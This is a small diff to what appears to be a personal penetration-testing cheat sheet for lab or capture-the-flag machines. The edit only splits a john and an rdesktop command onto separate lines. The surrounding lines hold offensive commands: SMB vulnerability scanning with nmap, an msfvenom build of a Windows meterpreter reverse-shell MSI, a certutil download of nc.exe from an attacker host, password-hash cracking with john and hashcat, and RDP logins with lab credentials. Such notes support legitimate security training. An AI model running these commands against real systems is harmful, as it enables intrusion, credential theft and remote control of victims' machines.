@@ -15,7 +15,8 @@ xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administra
 sudo nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln* 10.10.243.191
 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.239.155 -f msi -o setup.msi
-john --format:NT hash.txt /usr/share/wordlists/rockyou.txtrdesktop -u user -p password321 10.10.184.18
+john --format:NT hash.txt /usr/share/wordlists/rockyou.txt
+rdesktop -u user -p password321 10.10.184.18
 
 certutil -urlcache -f http://<IP>/nc.exe c:\Users\admin\Desktop\nc.exe
 hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
